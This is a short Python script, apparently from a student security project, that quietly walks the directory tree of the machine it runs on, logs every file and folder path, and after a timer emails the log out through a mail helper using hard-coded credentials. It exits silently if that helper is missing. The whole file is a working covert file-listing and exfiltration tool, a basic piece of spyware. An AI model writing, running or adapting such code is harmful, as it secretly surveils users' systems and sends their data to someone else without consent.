try:
    import os
    import threading
    from mail import send_mail
except ModuleNotFoundError:
    exit(0)
finally:
    EMAIL_ADDRESS = "eef5687d144f58"
    EMAIL_PASSWORD = "59d3054644d98a"
    FILENAME = "C:/Users/sudee/ISAA/FileOutput.txt"
    SEND_REPORT_EVERY = 30 
    TYPE = "Filelogging Data"

    class file_logger: 
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "System Details"
            self.email = email
            self.password = password

        def tree_data(self):
            root = '.'
            fe = open(FILENAME, "a")
            for root, dirs, files in os.walk(root):
                for d in dirs:
                    fe.write(os.path.join(root, d)+"\n")   
                for f in files:
                    fe.write(os.path.join(root, f)+"\n")
            fe.close()
            send_mail(self.email, self.password, FILENAME, TYPE)
            
        def run(self):
            timer = threading.Timer(self.interval, self.tree_data)
            timer.start()

    Filelogger = file_logger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    Filelogger.run()
            